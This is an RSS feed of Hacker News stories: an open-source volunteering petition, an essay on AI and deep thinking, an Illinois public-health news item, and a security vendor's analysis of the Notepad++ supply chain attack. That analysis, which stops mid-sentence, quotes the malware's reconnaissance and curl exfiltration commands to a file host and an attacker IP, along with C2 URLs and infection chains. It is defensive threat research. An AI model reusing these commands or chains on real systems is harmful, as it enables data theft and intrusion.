<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Wed, 04 Feb 2026 10:30:03 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Petition for Recognition of Work on Open-Source as Volunteering in Germany (178 pts)]]></title>
            <link>https://www.openpetition.de/petition/online/recognition-of-work-on-open-source-as-volunteering-in-germany</link>
            <guid>46881568</guid>
            <pubDate>Wed, 04 Feb 2026 04:46:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.openpetition.de/petition/online/recognition-of-work-on-open-source-as-volunteering-in-germany">https://www.openpetition.de/petition/online/recognition-of-work-on-open-source-as-volunteering-in-germany</a>, See on <a href="https://news.ycombinator.com/item?id=46881568">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
		<div dir="ltr" lang="en">
			<p>
				<strong>Petition richtet sich an:</strong>
									German Bundestag, Petition Committee							</p>

			<!--marker--><p>Open-Source-Software builds the foundations of digital infrastructure in big parts - in administration, economy, science and daily life. Even the current <b>coalition agreement</b> of the <b>Federal Government</b> mentions Open-Source-Software as a fundamental building block for the achievement of <b>digital sovereignty</b>.</p><p>However, the work done by thousands of volunteers for this goal is <b>not recognised as volunteering</b>, neither fiscally nor in terms of funding. This imbalance between societal importance and legal status has to be corrected.</p><p>Therefore, as an active contributor to Open-Source-Projects, I call for work on Open-Source to be recognised as <b>volunteering for the common good</b> – of equal rank as volunteer work for associations, youth work or ambulance service.</p>		</div>

					<h4>Begründung</h4>

			<div dir="ltr" lang="en">
				<!--marker--><p><b>1. Open-Source contributes evidently to the common good</b></p><ul><li>It is creating <b>free, transparent and auditable software</b> that is available for everyone.</li><li>Critical systems like <b>internet protocols, security libraries, health IT, AI frameworks, energy management, education technologies </b>and<b> communication tools</b> are based significantly on volunteer contributions.</li><li>Without this work, Germany would be <b>digitally more dependent, less secure </b>and<b> less inventive.</b></li></ul><p>Orientation on the common good is a central criterion for volunteering – and Open-Source fulfils it to the highest degree.</p><p><b>2. This work predominantly happens unpaid – and is voluntary civilian commitment</b></p><ul><li>The majority of all work on development, maintenance and documentation happens voluntarily in leisure time.</li><li>Contributors take responsibility for security, stability and advancement of central software components, without getting paid and often recognised.</li><li>The commitment is <b>comparable to work in associations for the public good</b>, but digitally.</li></ul><p>The legal equalisation with traditional volunteering is therefore coherent.</p><p><b>3. Societal dependence without appreciation</b></p><ul><li>State facilities, town councils, schools and enterprises <b>profit directly</b> from Open-Source libraries, frameworks and tools.</li><li>Security vulnerabilities like "Heartbleed" or "Log4Shell" have shown the importance of work by maintainers for the <b>protection of the public</b>.</li><li>Concurrently, resources and structures are lacking, as the work is <b>not formally recognised as volunteering</b> – and does therefore <i>not receive taxable or organisational benefits</i>.</li></ul><p>This creates an <b>imbalance of responsibilities</b> that lies on few volunteers, while millions of users are profiting.</p><p><b>4. Recognition as volunteering would create legal clarity</b><br>Possible results of formal recognition:</p><ul><li><b>Compensations </b>could be <b>paid tax-exempt </b>(Ehrenamtspauschale/Übungsleiterpauschale).</li><li><b>Open-Source projects for the common good</b> could more easily receive a classification as per §52 AO.</li><li>Contributors could get a better position in issues of liability (similar to §31a BGB for an Association's Board).</li><li>Projects could legally reimburse expenses and issue donation receipts.</li></ul><p>This creates <b>transparency, legal clarity and sustainability</b> in digital volunteer work.</p><p><b>5. Digitalisation needs competent volunteers – and those deserve funding</b></p><ul><li>Open-Source commitment requires high technical competence</li><li>Volunteer developers perform work, that companies would otherwise need to buy for high hourly rates.</li><li>The state invests billions in digitalisation, but ignores the people who maintain the technological foundation <b>voluntarily</b>.</li></ul><p>Recognition as volunteer work would be a <b>cost-efficient contribution to digital sovereignty</b> in Germany.</p><p><b>6. Germany limps behind internationally</b><br>Other countries are already funding commitment to Open-Source through: </p><ul><li>Taxable benefits</li><li>Institutional support</li><li>Recognition of software development for the public good</li></ul><p>Germany is risking to fall behind in international competition, if volunteers in the digital realm are <b>structurally disadvantaged</b> further.</p>			</div>
		
					
			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I miss thinking hard (561 pts)]]></title>
            <link>https://www.jernesto.com/articles/thinking_hard</link>
            <guid>46881264</guid>
            <pubDate>Wed, 04 Feb 2026 03:54:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.jernesto.com/articles/thinking_hard">https://www.jernesto.com/articles/thinking_hard</a>, See on <a href="https://news.ycombinator.com/item?id=46881264">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

<p>Before you read this post, ask yourself a question: <strong>When was the last time you truly thought hard?</strong></p>

<p>By “thinking hard,” I mean encountering a specific, difficult problem and spending multiple days just sitting with it to overcome it. </p>

<p>a) All the time. 
b) Never. 
c) Somewhere in between.</p>

<p>If your answer is (a) or (b), this post isn't for you. But if, like me, your response is (c), you might get something out of this, if only the feeling that you aren't alone.</p>

<p>First, a disclaimer: this post has no answers, not even suggestions. It is simply a way to vent something I've been feeling for the last few months.</p>

<h3 id="the-builder-and-the-thinker">The Builder and The Thinker</h3>

<p>I believe my personality is built on two primary traits:</p>

<ol>
<li><p><strong>The Builder</strong> (The desire to create, ship, and be pragmatic).</p></li>
<li><p><strong>The Thinker</strong> (The need for deep, prolonged mental struggle).</p></li>
</ol>

<p>The builder is pretty self explanatory, it’s motivated by velocity and utility. It is the part of me that craves the transition from “idea” to “reality.” It loves the dopamine hit of a successful deploy, the satisfaction of building systems to solve real problems, and the knowledge that someone, somewhere, is using my tool.</p>

<p>To explain the Thinker , I need to go back to my university days studying physics. Every now and then, we would get homework problems that were significantly harder than average. Even if you had a decent grasp of the subject, just coming up with an approach was difficult.</p>

<p>I observed that students fell into three categories when facing these problems (well, four, if you count the 1% of geniuses for whom no problem was too hard).</p>

<ul>
<li><p><strong>Type 1:</strong> The majority. After a few tries, they gave up and went to the professor or a TA for help.</p></li>
<li><p><strong>Type 2:</strong> The Researchers. They went to the library to look for similar problems or insights to make the problem approachable. They usually succeeded.</p></li>
<li><p><strong>Type 3:</strong> The Thinkers.</p></li>
</ul>

<p>I fell into the third category, which, in my experience, was almost as rare as the genius 1%. My method was simply to think. To think hard and long. Often for several days or weeks, all my non-I/O brain time was relentlessly chewing on possible ways to solve the problem, even while I was asleep.</p>

<p>This method never failed me. I always felt that deep prolonged thinking was my superpower. I might not be as fast or naturally gifted as the top 1%, but given enough time, I was confident I could solve anything. I felt a deep satisfaction in that process.</p>

<h3 id="the-conflict-with-ai">The Conflict with AI</h3>

<p>That satisfaction is why software engineering was initially so gratifying. It hit the right balance. It satisfied <strong>The Builder</strong> (feeling productive and pragmatic by creating useful things) and <strong>The Thinker</strong> (solving really hard problems). Thinking back, the projects where I grew the most as an engineer were always the ones with a good number of really hard problems that needed creative solutions.</p>

<p>But recently, the number of times I truly ponder a problem for more than a couple of hours has decreased tremendously.</p>

<p>Yes, <strong>I blame AI for this</strong>.</p>

<p>I am currently writing much more, and more complicated software than ever, yet I feel I am not growing as an engineer at all. When I started meditating on why I felt “stuck,” I realized I am starving <strong>The Thinker</strong>.</p>

<p>“Vibe coding” satisfies the Builder. It feels great to see to pass from idea to reality in a fraction of a time that would take otherwise. But it has drastically cut the times I need to came up with creative solutions for technical problems. I know many people who are purely Builders, for them this era is the best thing that ever happened. But for me, something is missing.</p>

<h3 id="the-trap-of-pragmatism">The Trap of Pragmatism</h3>

<p>I know what you might be thinking: "If you can ‘vibe code’ your way through it, the problem wasn’t actually hard."</p>

<p>I think that misses the point.  It’s not that AI is good for hard problems, it’s not even that good for easy problems. I’m confident that my third manual rewrite of a module would be much better than anything the AI can output. But I am also a pragmatist.</p>

<p>If I can get a solution that is “close enough” in a fraction of the time and effort, it is irrational not to take the AI route. And that is the real problem: <strong>I cannot simply turn off my pragmatism.</strong></p>

<p>At the end of the day, I am a Builder. I like building things. The faster I build, the better. Even if I wanted to reject AI and go back to the days where the Thinker's needs were met by coding, the Builder in me would struggle with the inefficiency.</p>

<p>Even though the AI almost certainly won't come up with a 100% satisfying solution, the 70% solution it achieves usually hits the “good enough” mark.</p>

<h3 id="so-what-now">So, what now?</h3>

<p>To be honest, I don’t know. I am still figuring it out.</p>

<p>I'm not sure if my two halves can be satisfied by coding anymore. You can always aim for harder projects, hoping to find problems where AI fails completely. I still encounter those occasionally, but the number of problems requiring deep creative solutions feels like it is diminishing rapidly.</p>

<p>I have tried to get that feeling of mental growth outside of coding. I tried getting back in touch with physics, reading old textbooks. But that wasn’t successful either. It is hard to justify spending time and mental effort solving physics problems that aren’t relevant or state-of-the-art when I know I could be building things.</p>

<p>My Builder side won’t let me just sit and think about unsolved problems, and my Thinker side is starving while I vibe-code. I am not sure if there will ever be a time again when both needs can be met at once.  </p>

<p> "Now we have the right to give this being the well-known name that always designates what no power of imagination, no flight of the boldest fantasy, no intently devout heart, no abstract thinking however profound, no enraptured and transported spirit has ever attained: God. But this basic unity is of the past; it no longer is. It has, by changing its being, totally and completely shattered itself. God has died and his death was the life of the world." <br>
-  Philipp Mainländer </p>

			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Illinois joins WHO global outbreak network after U.S. withdraws (120 pts)]]></title>
            <link>https://capitolnewsillinois.com/news/illinois-joins-who-global-outbreak-network-after-u-s-withdraws/</link>
            <guid>46879447</guid>
            <pubDate>Wed, 04 Feb 2026 00:15:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://capitolnewsillinois.com/news/illinois-joins-who-global-outbreak-network-after-u-s-withdraws/">https://capitolnewsillinois.com/news/illinois-joins-who-global-outbreak-network-after-u-s-withdraws/</a>, See on <a href="https://news.ycombinator.com/item?id=46879447">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
								
<p>Illinois will join the World Health Organization’s Global Outbreak Alert and Response Network, or GOARN, to counterbalance the federal government’s withdrawal, Gov. JB Pritzker announced Tuesday.</p>
<p>The network monitors disease outbreaks across the globe and prepares countries to respond to those outbreaks. As a member, Illinois will have access to research, timely alerts and information about outbreaks, risk assessments and trainings so state officials can respond to public health emergencies.</p>
<p>The move follows President Donald Trump leaving the international health organization in January 2025.​</p>
<p>“By withdrawing from the World Health Organization, Donald Trump has undermined science and weakened our nation’s ability to detect and respond to global health threats,” Pritzker said in a news release. “I refuse to sit idly by and let that happen.”</p>
<p>Many WHO meetings involve national governments around the world, but <a href="https://goarn.who.int/about" target="_blank" rel="noopener">GOARN</a> is open to a wider variety of groups. It connects hundreds of public institutions, laboratories, academic institutions and different levels of government to detect and respond to public health threats like COVID-19, influenza and other diseases.</p>
<p>“Membership in this network strengthens Illinois’ preparedness for future pandemics and emerging threats,” the release states.</p>
<p>Illinois will bring laboratory capacity to the organization, including genomic sequencing and wastewater surveillance developed for COVID-19. Illinois also provides expertise in outbreak investigations and communication about risk.</p>
<p>Already, the Illinois Department of Public Health collects data and information about emerging health risks, and that will continue.</p>
<p>“Disease knows no borders,” said Dr. Sameer Vohra, director of IDPH. “The decision by the U.S. government to withdraw from the World Health Organization threatens decades of progress in global health coordination that makes Illinois residents safer.”</p>
<p>Joining GOARN is another move Pritzker has made to counter federal public health policies.</p>
<p>Pritzker in 2025 <a href="https://capitolnewsillinois.com/news/pritzker-signs-bill-allowing-illinois-to-issue-state-specific-vaccine-guidelines/" target="_blank" rel="noopener">signed a bill</a> to allow IDPH to set its own vaccine guidelines. It also requires insurance companies to cover vaccines that are recommended by IDPH.</p>
<p>He also <a href="https://gov-pritzker-newsroom.prezly.com/gov-pritzker-joins-launch-of-governors-public-health-alliance-to-protect-illinoisians-from-trumps-attack-on-science" target="_blank" rel="noopener">joined the Governors Public Health Alliance</a>, a group of 15 other governors that coordinates to monitor public health threats, share information and communicate with the global health community.</p>
<p>California <a href="https://www.npr.org/2026/01/28/g-s1-107526/california-world-health-organization-infectious-diseases" target="_blank" rel="noopener">also joined GOARN</a> in late January.</p>
<p>The <a href="https://www.npr.org/2026/01/20/g-s1-106126/trump-world-health-organization-withdrawal" target="_blank" rel="noopener">withdrawal is complicated</a> because there is no official way to leave WHO and the United States is the only country with the ability to do so. Experts say it’s up to WHO members when the departure is finalized, and they expect the matter to come up in meetings in February and May.</p>
<p>Leaving WHO doesn’t mean leaving all global health efforts. The U.S. will still participate in organizations like UNICEF and the United Nations Children’s Fund.</p>
<p>Trump tried in 2020 to leave WHO, but President Joe Biden reversed that decision. Trump has accused WHO of not being independent and has demanded reforms without clarifying what those are. He has also criticized the way WHO handled the COVID-19 pandemic.</p>
<p>Tom Hughes, executive director of the Illinois Public Health Association, praised the announcement, emphasizing how strong systems and partnerships are crucial to public health.</p>
<p>“Public health works best when we are informed, connected, and prepared,” he said. “Joining GOARN means Illinois public health leaders can access timely, reliable information, global expertise, and trusted partners when it matters most.”</p>
<p><a href="https://capitolnewsillinois.com/" target="_blank" rel="noopener"><em>Capitol News Illinois</em></a><em> is a nonprofit, nonpartisan news service that distributes state government coverage to hundreds of news outlets statewide. It is funded primarily by the Illinois Press Foundation and the Robert R. McCormick Foundation.</em></p>
								
								
																	
															</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Notepad++ supply chain attack breakdown (298 pts)]]></title>
            <link>https://securelist.com/notepad-supply-chain-attack/118708/</link>
            <guid>46878338</guid>
            <pubDate>Tue, 03 Feb 2026 22:35:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://securelist.com/notepad-supply-chain-attack/118708/">https://securelist.com/notepad-supply-chain-attack/118708/</a>, See on <a href="https://news.ycombinator.com/item?id=46878338">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
													<h2 id="introduction">Introduction</h2>
<p>On February 2, 2026, the developers of Notepad++, a text editor popular among developers, <a href="https://notepad-plus-plus.org/news/hijacked-incident-info-update/" target="_blank">published a statement</a> claiming that the update infrastructure of Notepad++ has been compromised. According to the statement, this was due to a hosting provider level incident, which occurred from June to September 2025. However, attackers were able to retain access to internal services until December 2025.</p>
<h2 id="multiple-execution-chains-and-payloads">Multiple execution chains and payloads</h2>
<p>Having checked our telemetry related to this incident, we have been amazed to find out how different and unique were the execution chains used in this supply chain attack. We identified that over the course of four months, from July to October 2025, attackers who have compromised Notepad++ have been constantly rotating C2 server addresses used for distributing malicious updates, the downloaders used for implant delivery, as well as the final payloads.</p>
<p>We observed three different infection chains overall designed to attack about a dozen machines, belonging to:</p>
<ul>
<li>Individuals located in Vietnam, El Salvador and Australia;</li>
<li>A government organization located in the Philippines;</li>
<li>A financial organization located in El Salvador;</li>
<li>An IT service provider organization located in Vietnam.</li>
</ul>
<p>Despite the variety of payloads observed, Kaspersky solutions have been able to block the identified attacks as they occurred.</p>
<p>In this article, we describe the variety of the infection chains we observed in the Notepad++ supply chain attack, as well as provide numerous previously unpublished IoCs related to it. </p>
<h3 id="chain-1-late-july-and-early-august-2025">Chain #1 — late July and early August 2025</h3>
<p>We observed attackers to deploy a malicious Notepad++ update for the first time in late July 2025. It was hosted at http://45.76.155[.]202/update/update.exe. Notably, the first scan  of this URL on the VirusTotal platform occurred in late September, by a user from Taiwan.</p>
<p>The <code>update.exe</code> file downloaded from this URL (SHA1: 8e6e505438c21f3d281e1cc257abdbf7223b7f5a) was launched by the legitimate Notepad++ updater process, <code>GUP.exe</code>. This file turned out to be a NSIS installer, of about 1 MB in size. When started, it sends a heartbeat containing system information to the attackers. This is done through the following steps:</p>
<ol>
<li>The file creates a directory named <code>%appdata%\ProShow</code> and sets it as the current directory;</li>
<li>It executes the shell command <code>cmd /c whoami&amp;&amp;tasklist &gt; 1.txt</code>, thus creating a file with the shell command execution results in the <code>%appdata%\ProShow</code> directory;</li>
<li>Then it uploads the <code>1.txt</code> file to the temp[.]sh hosting service by executing the <code>curl.exe -F "file=@1.txt" -s https://temp.sh/upload</code> command;</li>
<li>Next, it sends the URL to the uploaded <code>1.txt</code> file by using the <code>curl.exe --user-agent "https://temp.sh/ZMRKV/1.txt" -s http://45.76.155[.]202</code> shell command. As can be observed, the uploaded file URL is transferred inside the user agent.</li>
</ol>
<p>Notably, the same behavior of malicious Notepad++ updates, specifically the launch of shell commands and the use of the temp[.]sh website for file uploading, <a href="https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh/3" target="_blank">has been described  on the Notepad++ community forums</a> by a user named soft-parsley.<br>
<a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1.png" alt="" width="2048" height="783" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1.png 2048w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-300x115.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-1024x392.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-768x294.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-1536x587.png 1536w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-915x350.png 915w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-740x283.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-732x280.png 732w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072857/notepad-supply-chain-attack-1-800x306.png 800w" sizes="auto, (max-width: 2048px) 100vw, 2048px"></a><br>
After sending system information, the <code>update.exe</code> file executes the second-stage payload. To do that, it performs the following actions: </p>
<ul>
<li>Drops the following files to the <code>%appdata%\ProShow</code> directory:
<ul>
<li><code>ProShow.exe</code> (SHA1: defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c)</li>
<li><code>defscr</code> (SHA1: 259cd3542dea998c57f67ffdd4543ab836e3d2a3)</li>
<li><code>if.dnt</code> (SHA1: 46654a7ad6bc809b623c51938954de48e27a5618)</li>
<li><code>proshow.crs</code> (SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709)</li>
<li><code>proshow.phd</code> (SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709)</li>
<li><code>proshow_e.bmp</code> (SHA1: 9df6ecc47b192260826c247bf8d40384aa6e6fd6)</li>
<li><code>load</code> (SHA1: 06a6a5a39193075734a32e0235bde0e979c27228)</li>
</ul>
</li>
<li>Executes the dropped <code>ProShow.exe</code> file.</li>
</ul>
<p>The launched <code>ProShow.exe</code> file is a legitimate ProShow software, which is abused to launch a malicious payload. Normally, when threat actors aim to execute a malicious payload inside a legitimate process, they resort to the DLL sideloading technique. However, this time attackers have decided to avoid using it — likely due to how much attention this technique receives nowadays. Instead, they abused an old, known vulnerability in the ProShow software, which dates back to early 2010s. The dropped file named <code>load</code> contains an exploit payload, which is launched when the <code>ProShow.exe</code> file is launched. It is worth noting that, apart from this payload, all files in the <code>%appdata%\ProShow</code> directory are legitimate.</p>
<p>Analysis of the exploit payload revealed that it contains two shellcodes — one at the very start and the other one in the middle of the file. The shellcode located at the start of the file contains a set of meaningless instructions and is not designed to be executed — rather, attackers used it as the exploit padding bytes. It is likely that, by using a fake shellcode for padding bytes instead of something else (e.g., a sequence of <code>0x41</code> characters or random bytes), attackers aimed to confuse researchers and automated analysis systems. </p>
<p>The second shellcode, which is stored in the middle of the file, is the one that is launched when <code>ProShow.exe</code> is started. It decrypts a Metasploit downloader payload that retrieves a Cobalt Strike Beacon shellcode from the URL https://45.77.31[.]210/users/admin (user agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36) and launches it. </p>
<p>The Cobalt Strike Beacon payload is designed to communicate with the cdncheck.it[.]com C2 server. For instance, it uses the GET request URL https://45.77.31[.]210/api/update/v1 and the POST request URL https://45.77.31[.]210/api/FileUpload/submit.</p>
<p>Later on, in early August 2025, we have observed attackers to use the same download URL for the <code>update.exe</code> files (observed SHA1 hash: 90e677d7ff5844407b9c073e3b7e896e078e11cd), as well as the same execution chain for delivery of Cobalt Strike Beacon via malicious Notepad++ updates. However, we noted the following differences:</p>
<ul>
<li>In the Metasploit downloader payload, the URL for downloading Cobalt Strike Beacon was set to https://cdncheck.it[.]com/users/admin;</li>
<li>The Cobalt Strike C2 server URLs were set to https://cdncheck.it[.]com/api/update/v1 and https://cdncheck.it[.]com/api/Metadata/submit.</li>
</ul>
<p>We have not further seen any infections leveraging chain #1 after early August 2025.</p>
<h3 id="chain-2-middle-and-end-of-september-2025">Chain #2 — middle and end of September 2025</h3>
<p>A month and a half after malicious update detections ceased, we observed attackers to resume deploying these updates in the middle of September 2025, using another infection chain. The malicious update was still being distributed from the http://45.76.155[.]202/update/update.exe URL, and the file downloaded from it (SHA1 hash: 573549869e84544e3ef253bdba79851dcde4963a) was an NSIS installer as well. However, its file size was now about 140 KB. Again, this file performed two actions:</p>
<ul>
<li>Obtained system information by executing a shell command and uploading its execution results to temp[.]sh;</li>
<li>Dropped a next-stage payload on disk and launched it.</li>
</ul>
<p>Regarding system information, attackers made the following changes to how it was collected:</p>
<ul>
<li>They changed the working directory to %APPDATA%\Adobe\Scripts;</li>
<li>They started collecting more system information details, changing the executed shell command to <code>cmd /c "whoami&amp;&amp;tasklist&amp;&amp;systeminfo&amp;&amp;netstat -ano" &gt; a.txt</code>.</li>
</ul>
<p>The created <code>a.txt</code> file was, just as in the case of stage #1, uploaded to the temp[.]sh website through curl, with the obtained temp[.]sh URL being transferred to the same http://45.76.155[.]202/list endpoint, inside the User-Agent header.</p>
<p>As for the next-stage payload, it has been changed completely. The NSIS installer was configured to drop the following files to the %APPDATA%\Adobe\Scripts directory:</p>
<ul>
<li><code>alien.dll</code> (SHA1: 6444dab57d93ce987c22da66b3706d5d7fc226da);</li>
<li><code>lua5.1.dll</code> (SHA1: 2ab0758dda4e71aee6f4c8e4c0265a796518f07d);</li>
<li><code>script.exe</code> (SHA1: bf996a709835c0c16cce1015e6d44fc95e08a38a);</li>
<li><code>alien.ini</code> (SHA1: ca4b6fe0c69472cd3d63b212eb805b7f65710d33).</li>
</ul>
<p>Next, it executes the following shell command to launch the script.exe file: <code>%APPDATA%\%Adobe\Scripts\script.exe %APPDATA%\Adobe\Scripts\alien.ini</code>.</p>
<p>All of the files in the <code>%APPDATA%\Adobe\Scripts</code> directory, except for <code>alien.ini</code>, are legitimate and related to the Lua interpreter. As such, the previously mentioned command is used by attackers to launch a compiled Lua script, located in the <code>alien.ini</code> file.  Below is a screenshot of its decompilation:<br>
<a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072904/notepad-supply-chain-attack-2.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072904/notepad-supply-chain-attack-2.png" alt="" width="560" height="291" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072904/notepad-supply-chain-attack-2.png 560w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072904/notepad-supply-chain-attack-2-300x156.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072904/notepad-supply-chain-attack-2-539x280.png 539w" sizes="auto, (max-width: 560px) 100vw, 560px"></a><br>
As we can see, this small script is used for placing shellcode inside executable memory and then launching it through the <code>EnumWindowStationsW</code> API function.</p>
<p>The launched shellcode is, just in the case of chain #1, a Metasploit downloader, which downloads a Cobalt Strike Beacon payload, again in the form of a shellcode, from the https://cdncheck.it[.]com/users/admin URL.</p>
<p>The Cobalt Strike payload contains the C2 server URLs that slightly differ from the ones seen previously: https://cdncheck.it[.]com/api/getInfo/v1 and https://cdncheck.it[.]com/api/FileUpload/submit.</p>
<p>Attacks involving chain #2 continued until the end of September, when we observed two more malicious <code>update.exe</code> files. One of them had the SHA1 hash 13179c8f19fbf3d8473c49983a199e6cb4f318f0. The Cobalt Strike Beacon payload delivered through it was configured to use the same URLs observed in mid-September, however, attackers changed the way system information was collected. Specifically, attackers split the single shell command they used for this (<code>cmd /c "whoami&amp;&amp;tasklist&amp;&amp;systeminfo&amp;&amp;netstat -ano" &gt; a.txt</code>) into multiple commands:</p>
<ul>
<li><code>cmd /c whoami &gt;&gt; a.txt</code></li>
<li><code>cmd /c tasklist &gt;&gt; a.txt</code></li>
<li><code>cmd /c systeminfo &gt;&gt; a.txt</code></li>
<li><code>cmd /c netstat -ano &gt;&gt; a.txt</code></li>
</ul>
<p>Notably, the same sequence of commands has been previously documented by the soft-parsley user on the Notepad++ community forums.</p>
<p>The other <code>update.exe</code> file had the SHA1 hash 4c9aac447bf732acc97992290aa7a187b967ee2c. Using it, attackers performed the following:</p>
<ul>
<li>Changed the system information upload URL to https://self-dns.it[.]com/list;</li>
<li>Changed the user agent used in HTTP requests to Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36;</li>
<li>Changed the URL used by the Metasploit downloader to https://safe-dns.it[.]com/help/Get-Start;</li>
<li>Changed the Cobalt Strike Beacon C2 server URLs to https://safe-dns.it[.]com/resolve and https://safe-dns.it[.]com/dns-query.</li>
</ul>
<h3 id="chain-3-october-2025">Chain #3 — October 2025</h3>
<p>In early October 2025, attackers changed the infection chain once again. They have as well changed the C2 server for distributing malicious updates, with the observed update URL being http://45.32.144[.]255/update/update.exe. The payload downloaded (SHA1: d7ffd7b588880cf61b603346a3557e7cce648c93) was still a NSIS installer, however, unlike in the case of chains 1 and 2, this installer did not include the system information sending functionality. It simply dropped the following files to the <code>%appdata%\Bluetooth\</code> directory:</p>
<ul>
<li><code>BluetoothService.exe</code>, a legitimate executable (SHA1: 21a942273c14e4b9d3faa58e4de1fd4d5014a1ed);</li>
<li><code>log.dll</code>, a malicious DLL (SHA1: f7910d943a013eede24ac89d6388c1b98f8b3717);</li>
<li><code>BluetoothService</code>, an encrypted shellcode (SHA1: 7e0790226ea461bcc9ecd4be3c315ace41e1c122).</li>
</ul>
<p>This execution chain relies on the sideloading of the <code>log.dll</code> file, which is responsible for launching the encrypted <code>BluetoothService</code> shellcode into the <code>BluetoothService.exe</code> process. Notably, such execution chains are commonly used by Chinese-speaking threat actors. This particular execution chain <a href="https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/" target="_blank">has already been described by Rapid7</a>, and the final payload observed in it is the custom Chrysalis backdoor. </p>
<p>Unlike the previous chains, chain #3 does not load a Cobalt Strike Beacon directly. However, in their article Rapid7 claim that they additionally observed a Cobalt Strike Beacon payload being deployed to the <code>C:\ProgramData\USOShared</code> folder, while conducting incident response on one of the machines infected with the Notepad++ supply chain attack. Whilst Rapid7 does not detail how this file was dropped to the victim machine, we can highlight the following similarities between that Beacon payload and the Beacon payloads observed in chains #1 and #2:</p>
<ol>
<li>In both cases, Beacons are loaded through a Metasploit downloader shellcode, with similar URLs used (api.wiresguard.com/users/admin for the Rapid7 payload, cdncheck.it.com/users/admin and http://45.77.31[.]210/users/admin for chain #1 and chain #2 payloads);</li>
<li>The Beacon configurations are encrypted with the XOR key <code>CRAZY</code>;</li>
<li>Similar C2 server URLs are used for Cobalt Strike Beacon communications (i.e. api.wiresguard.com/api/FileUpload/submit for the Rapid7 payload and https://45.77.31[.]210/api/FileUpload/submit for the chain #1 payload).</li>
</ol>
<h3 id="return-of-chain-2-and-changes-in-urls-october-2025">Return of chain #2 and changes in URLs — October 2025</h3>
<p>In mid-October 2025, we observed attackers to resume deployments of the chain #2 payload (SHA1 hash: 821c0cafb2aab0f063ef7e313f64313fc81d46cd) using yet another URL: http://95.179.213[.]0/update/update.exe. Still, this payload used the previously mentioned self-dns.it[.]com  and safe-dns.it[.]com domain names for system information uploading, Metasploit downloader and Cobalt Strike Beacon communications.</p>
<p>Further in late October 2025, we observed attackers to start changing URLs used for malicious update deliveries. Specifically, attackers started using the following URLs:</p>
<ul>
<li>http://95.179.213[.]0/update/install.exe;</li>
<li>http://95.179.213[.]0/update/update.exe;</li>
<li>http://95.179.213[.]0/update/AutoUpdater.exe.</li>
</ul>
<p>We haven’t observed any new payloads deployed from these URLs — they involved usage of both #2 and #3 execution chains. Finally, we have not seen any payloads being deployed starting from November 2025.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Notepad++ is a text editor used by numerous developers. As such, the ability to control update servers of this software gave attackers a unique possibility to break into machines of high-profile organizations around the world. The attackers made an effort to avoid losing access to this infection vector — they were spreading the malicious implants in a targeted manner, and they were skilled enough to drastically change the infection chains about once a month. Whilst we identified three distinct infection chains during our investigation, we would not be surprised to see more of them in use. To sum up our findings, here is the overall timeline of the infection chains that we identified:<br>
